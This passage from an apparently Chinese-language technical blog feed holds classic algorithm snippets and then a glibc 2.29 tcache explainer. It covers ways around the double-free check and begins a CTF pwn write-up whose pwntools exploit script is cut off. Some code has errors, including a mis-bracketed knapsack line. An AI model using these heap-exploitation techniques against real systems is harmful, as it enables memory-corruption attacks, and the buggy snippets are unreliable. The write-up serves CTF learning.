(Key[]) <span class="keyword">new</span> Comparable[maxN + <span class="number">1</span>]; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;  <span class="keyword">return</span> N == <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> N;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(Key v)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        pq[++N] = v;</span><br><span class="line">        swim(N);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Key <span class="title">delMax</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Key max = pq[<span class="number">1</span>];        <span class="comment">//从根节点得到最大元素</span></span><br><span class="line">        exch(<span class="number">1</span>,N--);         <span class="comment">//将其和最后一个元素交换</span></span><br><span class="line">        pq[N+<span class="number">1</span>] = <span class="keyword">null</span>;         <span class="comment">//防止对象游离</span></span><br><span class="line">        sink(<span class="number">1</span>);            <span class="comment">//恢复堆上的有序性</span></span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">less</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function">    </span>&#123;  <span class="keyword">return</span> pq[i].compareTo(pq[j]) &lt; <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">exch</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function">    </span>&#123;  Key t = pq[i]; pq[i] = pq[j]; pq[j] = t;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">swim</span><span class="params">(<span class="keyword">int</span> k)</span>            <span class="comment">//上浮</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>( k &gt; <span class="number">1</span> &amp;&amp; less(k/<span class="number">2</span>, k))</span><br><span class="line">        &#123;</span><br><span class="line">            exch(k/<span class="number">2</span>, k);</span><br><span class="line">            k = k/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sink</span><span class="params">(<span class="keyword">int</span> k)</span>       <span class="comment">//下沉</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">2</span>*k &lt;= N)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> j = <span class="number">2</span>*k;</span><br><span class="line">            <span class="keyword">if</span>(j &lt; N &amp;&amp; less(j, j+<span class="number">1</span>))   j++;</span><br><span class="line">            <span class="keyword">if</span>(!less(k, j)) <span class="keyword">break</span>;</span><br><span class="line">            exch(k,j);</span><br><span class="line">            k = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="3-快速幂"><a href="#3-快速幂" class="headerlink" title="3 快速幂"></a>3 快速幂</h1><p>思路类似于多项式求和</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pow2</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> result = <span class="number">1</span>, n, s = i;</span><br><span class="line">	<span class="keyword">while</span>(j)&#123;</span><br><span class="line">		n = j%<span class="number">2</span>;</span><br><span class="line">		j = j/<span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">1</span>)</span><br><span class="line">			result *= s;</span><br><span class="line">		s *= s;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="4-求多数元素"><a href="#4-求多数元素" class="headerlink" title="4 求多数元素"></a>4 求多数元素</h1><p>在原序列中去除两个不同的元素以后，原序列中的多数元素在新的序列中还是多数元素O(n)的时间复杂度</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> maj = a[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;len; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(maj == a[i])</span><br><span class="line">			count++;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			count--;</span><br><span class="line">			<span class="keyword">if</span>(count == <span class="number">0</span>)&#123;</span><br><span class="line">				maj = a[i+<span class="number">1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> maj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="5分治"><a href="#5分治" class="headerlink" title="5分治"></a>5分治</h1><h2 id="5-1-求最大最小值"><a href="#5-1-求最大最小值" class="headerlink" title="5.1 求最大最小值"></a>5.1 求最大最小值</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*寻找最小值需要进行n-1次比较，这已经是最优结果。如果需要同时找出最大值和最小值，可以直接进行两次查询，</span></span><br><span class="line"><span class="comment">一次最大值一次最小值，共需要2(n-1)次比较。而事实上，我们可以只通过3*[n/2]次比较就足以同时找到最大值和最小值。</span></span><br><span class="line"><span class="comment">通过成对的处理元素，先将一对输入元素比较，找到较大值和较小值。然后将较大值与当前最大值比较，较小值与当前最小值比较，</span></span><br><span class="line"><span class="comment">这样每两个元素需要比较3次，一共需要3*[n/2]次比较。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">max_min</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> &amp;minValue, <span class="keyword">int</span> &amp;maxValue)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (l == r) &#123;<span class="comment">// l 与 r之间只有一个元素</span></span><br><span class="line">		minValue = maxValue = a[l];</span><br><span class="line">		<span class="keyword">return</span>; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (l + <span class="number">1</span> == r)&#123; <span class="comment">// l 与 r 之间只有两个元素</span></span><br><span class="line">	    <span class="keyword">if</span>(a[l] &gt; a[r])&#123;</span><br><span class="line">	    	minValue = a[r];</span><br><span class="line">	    	maxValue = a[l];</span><br><span class="line">		&#125; </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			minValue = a[l];</span><br><span class="line">			maxValue = a[r];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> lmax,  lmin;</span><br><span class="line">	<span class="keyword">int</span> m = (l + r)/<span class="number">2</span>;</span><br><span class="line">	max_min(a, l, m, lmin, lmax); <span class="comment">//找出左边最大值和最小值 </span></span><br><span class="line">	<span class="keyword">int</span> rmax ,rmin;</span><br><span class="line">	max_min(a, m+<span class="number">1</span>, r, rmin, rmax); <span class="comment">// 找出右边最大值和最小值 </span></span><br><span class="line">	maxValue = max(lmax, rmax);</span><br><span class="line">	minValue = min(lmin, rmin); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-2-求第k小元素"><a href="#5-2-求第k小元素" class="headerlink" title="5.2 求第k小元素"></a>5.2 求第k小元素</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//划分——每次划分唯一确定一个元素位置</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span> A[], <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> pivot = A[low];</span><br><span class="line">	<span class="keyword">while</span>(low &lt; high)&#123;</span><br><span class="line">		<span class="keyword">while</span>(low &lt; high &amp;&amp; A[high] &gt;= pivot)&#123;</span><br><span class="line">			--high;</span><br><span class="line">		&#125;</span><br><span class="line">		A[low] = A[high]; <span class="comment">//将比基准小的元素移动到左端</span></span><br><span class="line">		<span class="keyword">while</span>(low &lt; high &amp;&amp; A[low] &lt;= pivot)&#123;</span><br><span class="line">			++low;</span><br><span class="line">		&#125; </span><br><span class="line">		A[high] = A[low];</span><br><span class="line">	&#125;</span><br><span class="line">	A[low] = pivot;</span><br><span class="line">	<span class="keyword">return</span> low;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> r = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">select_rank_k</span><span class="params">(<span class="keyword">int</span> A[], <span class="keyword">int</span> low, <span class="keyword">int</span> high, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> r_group = <span class="built_in">ceil</span>((high - low + <span class="number">1</span>) * <span class="number">1.0</span> / r); <span class="comment">//ceil 取上限共分为r_group个组</span></span><br><span class="line">	<span class="comment">//计算每个分组中值，存于A[]最前面</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= r_group; ++i)&#123;</span><br><span class="line">		sort(&amp;A[low + (i - <span class="number">1</span>)*r], &amp;A[(low + i*r <span class="number">-1</span>) &gt; high ? high: (low + i*r - <span class="number">1</span>)]);</span><br><span class="line">		swap(A[low + i - <span class="number">1</span>], A[low + (i<span class="number">-1</span>)*r + r/<span class="number">2</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//获得每个组的中值的中值（并置于A[low]位置，方便调用快排划分函数)</span></span><br><span class="line">	sort(&amp;A[low], &amp;A[low + r_group]);</span><br><span class="line">	swap(A[low], A[low + r_group /<span class="number">2</span>]);</span><br><span class="line">	<span class="keyword">int</span> cur = partition(A, low, high);</span><br><span class="line">	<span class="keyword">if</span>( cur == k<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> A[cur];</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ( cur &lt; k)&#123;</span><br><span class="line">		<span class="keyword">return</span> select_rank_k(A, cur + <span class="number">1</span>,  high, k);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> select_rank_k(A, low, cur - <span class="number">1</span>, k);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="6-动态规划"><a href="#6-动态规划" class="headerlink" title="6 动态规划"></a>6 动态规划</h1><h2 id="6-1-求最长子序列"><a href="#6-1-求最长子序列" class="headerlink" title="6.1 求最长子序列"></a>6.1 求最长子序列</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXLEN 50</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LCSLength</span><span class="params">(<span class="keyword">char</span> *x, <span class="keyword">char</span> *y, <span class="keyword">int</span> m, <span class="keyword">int</span> n, <span class="keyword">int</span> c[][MAXLEN])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=m; i++)</span><br><span class="line">		c[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=n; i++)</span><br><span class="line">		c[<span class="number">0</span>][i] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=m; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=n; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(x[i<span class="number">-1</span>] == y[j<span class="number">-1</span>])&#123;</span><br><span class="line">				c[i][j] = c[i<span class="number">-1</span>][j<span class="number">-1</span>] + <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				c[i][j] = max(c[i<span class="number">-1</span>][j],c[i][j<span class="number">-1</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printLCS</span><span class="params">(<span class="keyword">int</span> c[][MAXLEN], <span class="keyword">int</span> i, <span class="keyword">int</span> j,<span class="keyword">char</span> *x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> s[MAXLEN];</span><br><span class="line">	<span class="keyword">int</span> k = c[i][j];</span><br><span class="line">	s[k] = <span class="string">'\0'</span>;</span><br><span class="line">	<span class="keyword">while</span>(k&gt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(c[i][j] == c[i<span class="number">-1</span>][j]) i--;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (c[i][j] == c[i][j<span class="number">-1</span>]) j--;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			s[--k] = x[i<span class="number">-1</span>];</span><br><span class="line">			i--;</span><br><span class="line">			j--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s"</span>,s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> x[MAXLEN] = &#123;<span class="string">"ABCBDAB"</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> y[MAXLEN] = &#123;<span class="string">"BDCABA"</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> c[MAXLEN][MAXLEN];</span><br><span class="line">    <span class="keyword">int</span> m = <span class="built_in">strlen</span>(x);</span><br><span class="line">    <span class="keyword">int</span> n = <span class="built_in">strlen</span>(y);</span><br><span class="line">    LCSLength(x,y,m,n,c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,c[m][n]);</span><br><span class="line">    printLCS(c, m, n, x);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-2-背包问题"><a href="#6-2-背包问题" class="headerlink" title="6.2 背包问题"></a>6.2 背包问题</h2><h3 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h3><p>有N件物品和一个容量为V的背包。第i件物品的费用是c[i]，价值是w[i]。求解将哪些物品装入背包可使价值总和最大。</p>
<h3 id="基本思路-："><a href="#基本思路-：" class="headerlink" title="基本思路 ："></a>基本思路 ：</h3><p>这是最基础的背包问题，特点是：每种物品仅有一件，可以选择放或不放。 用子问题定义状态：即<code>f[i][v]</code>表示前i件物品恰放入一个容量为v的背包可以获得的最大价值。则其状态转移方程便是：</p>
<p><img src="/14/cl7iordqr0060293fmvkmppfm/1.png" alt></p>
<p>代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= W; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(j &lt; w[i])    dp[i][j]  = dp[i<span class="number">-1</span>][j];</span><br><span class="line">            <span class="keyword">else</span> dp[i][j] =  max(dp[i<span class="number">-1</span>][j], dp[i<span class="number">-1</span>][j - w[i]] + v[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="优化空间复杂度："><a href="#优化空间复杂度：" class="headerlink" title="优化空间复杂度："></a>优化空间复杂度：</h3><p>以上方法的时间和空间复杂度均为O(VN)，其中时间复杂度应该已经不能再优化了，但空间复杂度却可以优化到O(V)</p>
<p>只用一维数组的话要注意到，每次他都会利用上一行左边的值，那么我们只要每行从右向左遍历，那么就不会覆盖到原来的值了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">int</span> j = W; j &gt;= w[i]; j--)</span><br><span class="line">    dp[j] = max(dp[j], dp[j - w[i] + v[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>libc2.29利用小结</title>
    <url>/year/03/04/cl7iordpn002w293fx042bjfg/</url>
    <content><![CDATA[<h2 id="0x0简介"><a href="#0x0简介" class="headerlink" title="0x0简介"></a>0x0简介</h2><p>libc2.29的题目又与2.27的机制有所不同这里总结下</p>
<a id="more"></a>
<h2 id="0x1-新增机制"><a href="#0x1-新增机制" class="headerlink" title="0x1 新增机制"></a>0x1 新增机制</h2><p>tcache是glibc-2.26引入的一种新技术，目的是提升堆管理的性能，早期的libc对tcache基本没任何防护，简直到了为所欲为的地步，一不检查double free，二不检查size大小，使用起来比fastbins还要简单。</p>
<p>查看glibc-2.29 malloc.c的源码，tcache_entry结构体增加了一个新指针key放在bk的位置，用于检测double free。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span> <span class="comment">/* 新增指针 */</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p>在之前的版本，要填满tcache非常简单粗暴，如果程序不清空指针，可以由头到尾free同一个chunk，直接把tcache填满，在2.29下这个方法不再适用。下面继续看一下tcache_put和tcache_get部分的源码，看看这个新指针起到如何的作用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;   <span class="comment">// 写入tcache_perthread_struct地址</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;  <span class="comment">// 清空</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当一个属于tcache大小的chunk被free掉时，会调用tcache_put，e-&gt;key被写入tcache_perthread_struct的地址，也就是heap开头的位置。而当程序从tcache取出chunk时，会将e-&gt;key重新清空。</p>
<p>然后再看一下_int_free中tcache部分如何进行double free检测。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">    <span class="comment">/* Check to see if it's already in the tcache.  */</span></span><br><span class="line">    tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This test succeeds on double free.  However, we don't 100%</span></span><br><span class="line"><span class="comment">       trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">       2^&lt;size_t&gt; chance), so verify it's not an unlikely</span></span><br><span class="line"><span class="comment">       coincidence before aborting.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache)) <span class="comment">// 检查是否为tcache_perthread_struct地址</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_entry *tmp;</span><br><span class="line">        LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">        <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">          <span class="keyword">if</span> (tmp == e)                      <span class="comment">// 检查tcache中是否有一样的chunk</span></span><br><span class="line">        malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">        <span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">           few cycles, but don't abort.  */</span></span><br><span class="line">      &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>

<p>首先_int_free会检查chunk的key是否为tcache_perthread_struct地址，然后会遍历tcache，检查此chunk是否已经在tcache中，如有则触发malloc_printerr报错free(): double free detected in tcache 2。</p>
<p>简单总结一下，2.29下tcache触发double free报错的条件为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">e-key == &amp;tcache_perthread_struct &amp;&amp; chunk in tcachebin[chunk_idx]</span><br></pre></td></tr></table></figure>

<p>新增保护主要还是用到e-&gt;key这个属性，因此绕过想绕过检测进行double free，这里也是入手点。绕过思路有以下两个：</p>
<ol>
<li>如果有UAF漏洞或堆溢出，可以修改e-&gt;key为空，或者其他非tcache_perthread_struct的地址。这样可以直接绕过_int_free里面第一个if判断。不过如果UAF或堆溢出能直接修改chunk的fd的话，根本就不需要用到double free了。</li>
<li>利用堆溢出，修改chunk的size，最差的情况至少要做到off by null。留意到_int_free里面判断当前chunk是否已存在tcache的地方，它是根据chunk的大小去查指定的tcache链，由于我们修改了chunk的size，查找tcache链时并不会找到该chunk，满足free的条件。虽然double free的chunk不在同一个tcache链中，不过不影响我们使用tcache poisoning进行攻击。</li>
</ol>
<h2 id="0x3-i春秋新春抗疫-Document-kn0ck"><a href="#0x3-i春秋新春抗疫-Document-kn0ck" class="headerlink" title="0x3 i春秋新春抗疫 Document(kn0ck)"></a>0x3 i春秋新春抗疫 Document(kn0ck)</h2><p>很明显的一个uaf，很好的利用了tcache的特性<br>思路就是先填满tcache，然后再泄露，利用小块的0x8内的内容写到free_hook<br>环境用的是现成的pwndocker，然后libc是用的glibc-all-in-one中下载的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> context.log_level = <span class="string">'debug'</span></span><br><span class="line"> sh = process([<span class="string">"./ld-2.29.so"</span>, <span class="string">"./pwn"</span>], env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/home/wood/pwn/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so"</span>&#125;)</span><br><span class="line"> libc = ELF(<span class="string">'/home/wood/pwn/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so'</span>)</span><br><span class="line"> context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"> gdb.attach(sh)</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,content)</span>:</span></span><br><span class="line">     sh.recvuntil(<span class="string">"Give me your choice : \n"</span>)</span><br><span class="line">     sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">     sh.recvuntil(<span class="string">'input name\n'</span>)</span><br><span class="line">     sh.send(name)</span><br><span class="line">     sh.recvuntil(<span class="string">'input sex\n'</span>)</span><br><span class="line">     sh.sendline(<span class="string">'W'</span>)</span><br><span class="line">     sh.recvuntil(<span class="string">"input information\n"</span>)</span><br><span class="line">     sh.send(content)</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">     sh.recvuntil(<span class="string">"Give me your choice : \n"</span>)</span><br><span class="line">     sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">     sh.recvuntil(<span class="string">"Give me your index : \n"</span>)</span><br><span class="line">     sh.sendline(str(idx))</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">     sh.recvuntil(<span class="string">"Give me your choice : \n"</span>)</span><br><span class="line">     sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">     sh.recvuntil(<span class="string">"Give me your index : \n"</span>)</span><br><span class="line">     sh.sendline(str(idx))</span><br><span class="line">     sh.recvuntil(<span class="string">"Are you sure change sex?\n"</span>)</span><br><span class="line">     sh.sendline(<span class="string">'Y'</span>)</span><br><span class="line">     sh.recvuntil(<span class="string">"Now change information\n"</span>)</span><br><span class="line">     sh.send(content)</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">     sh.recvuntil(<span class="string">"Give me your choice : \n"</span>)</span><br><span class="line">     sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">     sh.recvuntil(<span class="string">"Give me your index : \n"</span>)</span><br><span class="line">     sh.sendline(str(idx))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> add(<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'a'</span>*<span class="number">0x70</span>)</span><br><span class="line"> add(<span class="string">'b'</span>*<span class="number">8</span>,<span class="string">'b'</span>*<span 